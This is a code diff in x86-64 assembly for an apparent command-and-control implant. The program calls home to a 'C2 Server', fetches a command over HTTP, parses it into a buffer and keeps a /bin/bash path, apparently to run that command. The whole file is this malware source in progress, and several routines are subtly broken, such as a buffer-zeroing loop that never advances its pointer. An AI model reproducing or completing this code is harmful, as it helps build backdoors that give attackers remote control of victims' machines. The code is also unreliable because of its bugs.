@@ -1,19 +1,25 @@
 section .data
+    ; Socket data
     server_ip db "127.0.0.1", 0x0           ; IP of C2 Server
     server_port dw 8080                     ; 8080 for alternate HTTP
-    bash_path db "/bin/bash", 0x0           ; Path to shell
     socket_fd dq 0x0
+    ; Error treating
     err_msg db "Program exits due to errors", 0x0
     err_msg_len dq 0x1c
+    ; Http communication strings
     http_GET_msg db "GET / HTTP/1.1", 0x0D ,0x0A, 0x0D ,0x0A, 0x0           ; GET message
     http_GET_msg_len db 0x12                ; Self-explanatory, really
     ; timespec struct
     sleep_time dq 0                         ; seconds     
     sleep_nsec dq 50000000                  ; nanoseconds (50ms)
+    ; Misc data
+    bash_path db "/bin/bash", 0x0           ; Path to shell
+    cmd_buffer_length dq 0x0                ; Length of the cmd_buffer
 
 section .bss
     rx_buffer resb 0x400                    ; Receiving buffer from the server, 1KB max
     tx_buffer resb 0x400                    ; Transmitting buffer to the server, 1KB max
+    cmd_buffer resb 0x100                   ; Buffer for received command
 
 section .text
     global _start
@@ -21,10 +27,11 @@ section .text
     global fn_error_exit
     global fn_read_socket
     global fn_write_socket
-    global fn_dbg_print_rx_buffer
     global fn_get_command
     global fn_poll_socket
     global fn_sleep_ns
+    global fn_clean_buffer
+    global fn_parse_command
 
 ; Function to exit
 fn_error_exit:
@@ -39,6 +46,26 @@ fn_error_exit:
     mov rdi, 0x1                ; Error code
     syscall
 
+; Debug function to print the cmd_buffer
+fn_dbg_print_cmd_buffer:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    ; Write buffer to STDOUT
+    mov rax, 0x1                ; read syscall
+    mov rdi, 0x1                ; socket file descriptor
+    lea rsi, [cmd_buffer]       ; pointer to the buffer
+    mov rdx, 0x100              ; buffer size
+    syscall
+
+    cmp rax, 0
+    jl fn_error_exit            ; exit if an error occurred
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
 ; Debug function to print the rx_buffer
 fn_dbg_print_rx_buffer:
     push rbp
@@ -52,8 +79,94 @@ fn_dbg_print_rx_buffer:
     mov rdx, 0x400              ; buffer size
     syscall
 
-    cmp rax, 0                 
+    cmp rax, 0
     jl fn_error_exit            ; exit if an error occurred
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; Function to zero buffers
+; Parameters:
+; rdi - address of buffer
+; rsi - length of buffer
+fn_clean_buffer:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    xor rcx, rcx
+.loop:
+    mov byte [rdi], 0x0         ; Zero out the buffer
+    inc rcx
+    cmp rcx, rsi
+    jl .loop
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; Function to parse the received command and store it in cmd_buffer
+fn_parse_command:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    ; Trick is to find \r\n\r\n in http command
+    ; Iterate through the whole buffer to find that pattern
+    xor rax, rax                ; The pattern finder
+    xor rcx, rcx
+    lea rdi, [rx_buffer]
+
+    ; if (rx_buffer[rcx] == '\r')
+    ;    rax++;
+    ; else if (rx_buffer[rcx] == '\n')
+    ;    rax++;
+    ; else if (rx_buffer[rcx] == '\0')
+    ;    break;
+    ; else
+    ;    rax=0;
+
+; Start at rcx = 1, but it will never find command at that offset
+.parse_loop:
+    inc rcx
+    cmp rax, 0x4
+    je .break_parse_loop
+.compare_0D:
+    cmp byte [rdi+rcx], 0x0D    ; Compare to \r
+    jne .compare_0A
+    inc rax                     ; Hit
+    jmp .parse_loop_end
+.compare_0A:
+    cmp byte [rdi+rcx], 0x0A    ; Compare to \n
+    jne .compare_EOF
+    inc rax                     ; Hit
+    jmp .parse_loop_end
+.compare_EOF:
+    xor rax, rax                ; If not \r or \n, zero rax
+    cmp byte [rdi], 0x0
+    je .break_parse_loop
+.parse_loop_end:
+    jmp .parse_loop
+
+.break_parse_loop:
+
+    ; Here we have rax = 4 or not
+    ; Offset of command is rcx
+    cmp rax, 0x4                ; Verify if \r\n\r\n has been found
+    jne fn_error_exit
+    
+    ; Copy the command into cmd_buffer and set length of it when \0 is found 
+    xor rdx, rdx                ; Use secondary counter
+    lea rsi, [cmd_buffer]       ; Load address of command buffer
+.copy_loop:
+    mov al, byte [rdi+rcx]      ; Load byte from rx_buffer + rcx 
+    mov byte [rsi+rdx], al      ; Store byte into cmd_buffer + rdx
+    inc rdx
+    inc rcx
+    mov al, byte [rdi+rcx]
+    cmp rax, 0x0
+    jne .copy_loop
 
     mov rsp, rbp
     pop rbp
@@ -238,6 +351,14 @@ fn_get_command:
     ; Read command from server
     call fn_read_socket
 
+    ; Parse command from whole buffer and store in cmd_buffer
+    call fn_parse_command
+
+    ; Clean rx_buffer after use
+    lea rdi, [rx_buffer]
+    mov rsi, 0x400
+    call fn_clean_buffer
+
     mov rsp, rbp
     pop rbp
     ret
@@ -251,7 +372,8 @@ _start:
     ; Get command from server
     call fn_get_command
 
-    call fn_dbg_print_rx_buffer
+    ;call fn_dbg_print_rx_buffer
+    call fn_dbg_print_cmd_buffer
 
     ; Exit the program
     mov rax, 0x3c               ; exit syscall
